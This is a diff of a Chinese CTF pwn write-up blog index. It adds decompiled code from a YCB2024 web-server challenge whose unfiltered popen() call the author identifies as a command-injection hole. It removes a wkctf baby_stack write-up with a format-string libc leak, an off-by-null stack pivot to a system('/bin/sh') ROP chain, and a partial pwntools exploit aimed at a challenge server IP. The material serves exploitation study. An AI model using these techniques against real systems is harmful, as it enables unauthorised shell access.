+    puts_error<span class="token punctuation">(</span><span class="token number">501</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Implemented"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"That method is not implemented."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> strncmp<span class="token punctuation">(</span>httpVersion<span class="token punctuation">,</span> <span class="token string">"HTTP/1.0"</span><span class="token punctuation">,</span> 8u<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Bad protocol."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> requestPath <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Bad filename."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  haystack <span class="token operator">=</span> v37<span class="token punctuation">;</span>
+  urldecode<span class="token punctuation">(</span>v37<span class="token punctuation">,</span> v37<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !<span class="token operator">*</span>haystack <span class="token punctuation">)</span>
+    haystack <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span>
+  v20 <span class="token operator">=</span> strlen<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>haystack <span class="token operator">==</span> <span class="token string">'/'</span>                         <span class="token operator">//</span> 目录穿越检查
+    <span class="token operator">|</span><span class="token operator">|</span> !strcmp<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span>
+    <span class="token operator">|</span><span class="token operator">|</span> !strncmp<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"../"</span><span class="token punctuation">,</span> 3u<span class="token punctuation">)</span>
+    <span class="token operator">|</span><span class="token operator">|</span> strstr<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"/../"</span><span class="token punctuation">)</span>
+    <span class="token operator">|</span><span class="token operator">|</span> !strcmp<span class="token punctuation">(</span><span class="token operator">&amp;</span>haystack<span class="token punctuation">[</span>v20 <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"/.."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Illegal filename."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !sub_1F74<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Invalid file name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  stdout_fd <span class="token operator">=</span> dup<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v4 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v24 <span class="token operator">=</span> dup<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  freopen<span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  freopen<span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  stream <span class="token operator">=</span> popen<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> modes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> stream <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    pclose<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v6 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    dup2<span class="token punctuation">(</span>stdout_fd<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v7 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    dup2<span class="token punctuation">(</span>v24<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    close<span class="token punctuation">(</span>stdout_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    close<span class="token punctuation">(</span>v24<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> stat<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+      puts_error<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"File not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v29<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> <span class="token number">0xF000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4000</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> haystack<span class="token punctuation">[</span>v20 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        snprintf<span class="token punctuation">(</span>v40<span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"Location: %s/"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>requestPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        puts_error<span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Found"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v40<span class="token punctuation">,</span> <span class="token string">"Directories must end with a slash."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      snprintf<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"%sindex.html"</span><span class="token punctuation">,</span> haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> stat<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        sub_23D9<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Ok"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        v26 <span class="token operator">=</span> scandir<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token operator">&amp;</span>namelist<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>const void <span class="token operator">*</span><span class="token punctuation">,</span> const void <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>alphasort<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v26 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v26<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
+          <span class="token punctuation">&#123;</span>
+            sub_2704<span class="token punctuation">(</span>v32<span class="token punctuation">,</span> 0x3E8u<span class="token punctuation">,</span> <span class="token punctuation">(</span>unsigned __int8 <span class="token operator">*</span><span class="token punctuation">)</span>namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            snprintf<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"%s/%s"</span><span class="token punctuation">,</span> haystack<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span> lstat<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+              v8 <span class="token operator">=</span> localtime<span class="token punctuation">(</span><span class="token operator">&amp;</span>v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              strftime<span class="token punctuation">(</span>v31<span class="token punctuation">,</span> 0x10u<span class="token punctuation">,</span> <span class="token string">"%d%b%Y %H:%M"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              printf<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"%s\">%-32.32s&lt;/a>%15s %14lld\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">,</span> v31<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v29<span class="token punctuation">.</span>st_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              sub_20C6<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span>
+            <span class="token punctuation">&#123;</span>
+              printf<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"%s\">%-32.32s&lt;/a>    ???\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            printf<span class="token punctuation">(</span>
+              <span class="token string">"&lt;/pre>\n&lt;hr>\n&lt;address>&lt;a href=\"%s\">%s&lt;/a>&lt;/address>\n&lt;/body>&lt;/html>\n"</span><span class="token punctuation">,</span>
+              <span class="token string">"https://2024ycb.dasctf.com/"</span><span class="token punctuation">,</span>
+              <span class="token string">"YCB2024"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">&#123;</span>
+          perror<span class="token punctuation">(</span><span class="token string">"scandir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        goto LABEL_74<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      haystack <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    v27 <span class="token operator">=</span> fopen<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> !v27 <span class="token punctuation">)</span>
+      puts_error<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Forbidden"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"File is protected."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    tv_sec <span class="token operator">=</span> v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">;</span>
+    st_size <span class="token operator">=</span> v29<span class="token punctuation">.</span>st_size<span class="token punctuation">;</span>
+    v11 <span class="token operator">=</span> sub_2566<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    sub_23D9<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Ok"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v11<span class="token punctuation">,</span> st_size<span class="token punctuation">,</span> tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      c <span class="token operator">=</span> getc<span class="token punctuation">(</span>v27<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> c <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      putchar<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+LABEL_74<span class="token punctuation">:</span>
+    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v44 <span class="token operator">!=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    check_canary<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>程序的逻辑很长，实现了一个http request parse，然后相应请求，大多数逻辑都是对http request的格式做判断，还有目录穿越的检查</p>
+<p>漏洞出在这里popen这里</p>
+
+
+<p>这个popen会fork一个子进程，然后调用shell，把参数传过去，也没有做过滤，所以可以通过这里执行命令</p>
+
+
+<p>exp</p>
+	
+	</div>
+  <a type="button" href="/2024/09/04/羊城杯2024pwn/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/09/02/gdbjail/" >gdbjail</a>
 		</h3>
 		</div>
@@ -1581,134 +1880,6 @@ __int64 <span class="token function">delete_the_book</span><span class="token pu
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/07/15/wkctf-pwn/" >wkctf_pwn</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-07-15  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/wkctf_pwn">https://github.com/nyyyddddn/ctf/tree/main/wkctf_pwn</a></p>
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>在guess number逻辑这里用格式化字符串泄露 libc地址后</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>
-  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>
-
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v0 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>echo 这存在一个 off by null的溢出，有大量的leave ret的逻辑，走完这些leave ret 栈就被迁移到了buf上，由于不知道具体位置，找大量的 nop: ret的gadget写满buf，再结尾写一个system binsh的rop就好了，有可能会因为system中 xmm寄存器 rsp对齐的原因失败，多跑几次就好了</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-100h] BYREF</span>
-
-  <span class="token keyword">return</span> <span class="token function">echo_inner</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">int</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>exp</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment"># from LibcSearcher import *</span>
-<span class="token keyword">import</span> itertools
-<span class="token keyword">import</span> ctypes
-
-context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
-
-is_debug <span class="token operator">=</span> <span class="token number">0</span>
-IP <span class="token operator">=</span> <span class="token string">"110.40.35.73"</span>
-PORT <span class="token operator">=</span> <span class="token number">33632</span>
-
-elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
-libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
-
-<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
-sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
-r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
-ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-sla<span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
-
-
-sla<span class="token punctuation">(</span><span class="token string">"Pick a number:"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">)</span>
-
-ru<span class="token punctuation">(</span><span class="token string">"Your magic number is: "</span><span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>
-success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002164f</span>
